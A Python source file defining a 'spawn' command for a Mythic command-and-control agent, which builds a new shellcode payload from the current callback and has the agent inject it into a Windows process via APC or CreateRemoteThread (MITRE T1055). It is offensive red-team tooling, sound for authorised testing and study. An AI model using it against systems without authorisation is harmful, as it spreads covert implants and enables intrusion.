from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *


class SpawnArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="technique",
                cli_name="technique",
                display_name="Injection Technique",
                type=ParameterType.ChooseOne,
                default_value="apc",
                choices=["apc", "createremotethread"],
                description="Injection technique to use for spawning the new callback.",
                parameter_group_info=[
                    ParameterGroupInfo(required=True, ui_position=1, group_name="Default"),
                ],
            ),
        ]

    async def parse_arguments(self):
        if len(self.command_line) == 0:
            self.add_arg("technique", "apc")
        elif self.command_line[0] == "{":
            self.load_args_from_json_string(self.command_line)
        else:
            self.add_arg("technique", self.command_line.strip())


class SpawnCommand(CommandBase):
    cmd = "spawn"
    needs_admin = False
    help_cmd = "spawn [-technique apc|createremotethread]"
    description = "Spawn a new callback by injecting a fresh payload into the configured spawnto process. The payload is automatically built from the current callback's configuration."
    version = 1
    author = "@haha150"
    argument_class = SpawnArguments
    attackmapping = ["T1055"]
    attributes = CommandAttributes(
        supported_os=[SupportedOS.Windows],
    )

    async def create_go_tasking(self, taskData: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        response = PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
        )

        # Build a new shellcode payload from the current callback's registered payload
        build_resp = await SendMythicRPCPayloadCreateFromUUID(
            MythicRPCPayloadCreateFromUUIDMessage(
                TaskID=taskData.Task.ID,
                PayloadUUID=taskData.Callback.RegisteredPayloadUUID,
                NewDescription=f"Spawn payload - {taskData.Task.ID}",
                NewFilename="spawn.bin",
            )
        )

        if not build_resp.Success:
            raise Exception(f"Failed to build spawn payload: {build_resp.Error}")

        # Wait for the payload to finish building
        while True:
            import asyncio
            await asyncio.sleep(2)
            search_resp = await SendMythicRPCPayloadSearch(
                MythicRPCPayloadSearchMessage(
                    PayloadUUID=build_resp.NewPayloadUUID,
                )
            )
            if not search_resp.Success:
                raise Exception(f"Failed to search for payload: {search_resp.Error}")
            
            if len(search_resp.Payloads) == 0:
                raise Exception("Payload not found after creation")
            
            payload = search_resp.Payloads[0]
            if payload.BuildPhase == "success":
                file_resp = await SendMythicRPCFileSearch(
                    MythicRPCFileSearchMessage(
                        TaskID=taskData.Task.ID,
                        PayloadUUID=build_resp.NewPayloadUUID,
                    )
                )
                if not file_resp.Success or len(file_resp.Files) == 0:
                    raise Exception("Failed to find built payload file")
                
                taskData.args.add_arg("uuid", file_resp.Files[0].AgentFileId)
                break
            elif payload.BuildPhase == "error":
                raise Exception(f"Payload build failed: {payload.Error}")

        technique = taskData.args.get_arg("technique")
        response.DisplayParams = f"New callback via {technique} injection"
        return response

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
        return resp
